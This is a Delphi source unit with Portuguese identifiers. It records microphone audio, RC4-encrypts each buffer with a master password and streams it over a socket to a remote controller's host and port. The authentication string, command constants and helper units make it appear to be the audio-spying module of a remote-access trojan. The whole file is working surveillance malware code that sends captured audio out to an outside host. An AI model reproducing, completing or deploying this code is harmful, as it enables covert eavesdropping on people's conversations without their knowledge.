Unit UnitAudio;

Interface

Uses
  windows;

type
  TThreadInfoAudio = record
    Password: string;
    host: String;
    port: integer;
    IdentificacaoNoCliente: String;
    Sample: integer;
    Channel: integer;
end;

procedure CarregarVariaveisAudio(_ThreadInfoAudio: TThreadInfoAudio);
procedure ThreadedTransferAudio(Parameter: Pointer);
procedure FinalizarAudio;

implementation

uses
  StreamUnit,
  ACMIn,
  ACMConvertor,
  MMSystem,
  SocketUnit,
  UnitDiversos,
  unitcomandos,
  UnitCryptString,
  UnitServerUtils,
  UnitConexao,
  UnitDebug;

type
  TMain = class
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
    Procedure SendStream(psocket: TClientSocket; SendStream: TMemoryStream);
  end;

const
  WM_QUIT = $0012;

var
  ACMC: TACMConvertor;
  ACMI: TACMIn;
  ThreadInfoAudio: TThreadInfoAudio;
  SocketTransfAudio: TClientSocket;
  Main: TMain;
  SairAgora: boolean;

procedure FinalizarAudio;
begin
  if (SocketTransfAudio <> nil) and (SocketTransfAudio.Connected = true) then
  begin
    try
      SocketTransfAudio.Disconnect(erro16);
      except
    end;
  end;
  sleep(500);
  SairAgora := true;
  try
    if ACMC <> nil then ACMC.Active := False;
    if ACMC <> nil then ACMC.Free;
    if ACMI <> nil then ACMI.Close;
    if ACMI <> nil then ACMI.Free;
    ACMI := nil;
    ACMC := nil;
    except
  end;
end;

procedure CarregarVariaveisAudio(_ThreadInfoAudio: TThreadInfoAudio);
begin
  ThreadInfoAudio := _ThreadInfoAudio;
  SairAgora := false;
end;

Procedure TMain.SendStream(psocket: TClientSocket; SendStream: TMemoryStream);
var
  StreamSize: integer;
  StartPos: Integer;
  AmountInBuf: Integer;
  AmountSent: Integer;
  Buffer: array[0..MaxBufferSize] of Byte;

  TempStr: string;
begin
  SendStream.Position := 0;
  StreamSize := SendStream.Size;
  if StreamSize <= 0 then exit;

  try
    SairAgora := false;

    while (pSocket.Connected = true) and (SairAgora = false) do
    begin
      processmessages;
      sleep(100);
      StartPos := SendStream.Position;
      AmountInBuf := SendStream.Read(Buffer, SizeOf(Buffer));
      if AmountInBuf > 0 then
      begin
        setlength(tempstr, AmountInBuf);
        copymemory(@tempstr[1], @Buffer, AmountInBuf);

        TempStr := EnDecryptStrRC4b(TempStr, MasterPassword);
        if length(tempstr) > 0 then
        begin
          pSocket.SendString(IntToStr(length(TempStr)) + '|' + #10);
          AmountSent := pSocket.SendBuffer(TempStr[1], length(TempStr));
        end;

        if AmountInBuf > AmountSent then
        begin
          if (StartPos + AmountSent) >= SendStream.Size then
          SendStream.Position := SendStream.Size else
          SendStream.Position := StartPos + AmountSent
        end else if SendStream.Position = SendStream.Size then Break;
      end;
    end;
    finally
    //SendStream.free;
  end;
end;

procedure TMain.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  NewSize: Integer;
  Stream: TMemoryStream;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  NewSize := ACMC.Convert;
  Stream := TMemoryStream.Create;
  Stream.Size := NewSize;
  Stream.WriteBuffer(ACMC.BufferOut^, NewSize);
  Stream.Position := 0;
  SendStream(SocketTransfAudio, Stream);
  Stream.Free;
end;

procedure ThreadedTransferAudio(Parameter: Pointer);
type
  MyBufferFull = procedure(Sender: TObject; Data: Pointer; Size: Integer);

var
  Format: TWaveFormatEx;
  msg : TMsg;
begin
  if Main <> nil then
  begin
    Main.Free;
    Main := nil;
  end;
  Main := TMain.Create;

  FinalizarAudio;
  SairAgora := false;

  try
    SocketTransfAudio := TClientSocket.Create;
    SocketTransfAudio.Connect(ThreadInfoAudio.host, ThreadInfoAudio.port);
    try
      EnviarTexto(SocketTransfAudio, ThreadInfoAudio.Password + '|Y|' + RESPOSTA + '|' + ThreadInfoAudio.IdentificacaoNoCliente + '|' + AUDIO + '|' + AUDIOGETBUFFER + '|');
      except
    end;
    sleep(1000);
    if SocketTransfAudio.Connected = false then
    begin
      SocketTransfAudio.free;
      exit;
    end;

    begin
      Format.nSamplesPerSec := ThreadInfoAudio.Sample;
      Format.nChannels := ThreadInfoAudio.Channel;
      Format.wBitsPerSample := 16;
      Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
      Format.nBlockAlign := Format.nChannels * 2;

      if ACMC = nil then ACMC := TACMConvertor.Create;
      if ACMI = nil then ACMI := TACMIn.Create;

      ACMI.OnBufferFull := Main.BufferFull;

      ACMC.FormatIn.Format.nChannels := Format.nChannels;
      ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
      ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
      ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
      ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
      ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;
      ACMI.BufferSize := ACMC.InputBufferSize;
      ACMC.Active := True;
      ACMI.Open(ACMC.FormatIn);
    end;
    except
    begin
      ACMC.Active := False;
      ACMI.Close;
      ACMI.Free;
      ACMC.Free;
      Main.Free;
      Main := nil;
    end;
  end;
  while true do _processmessages;
end;

end.

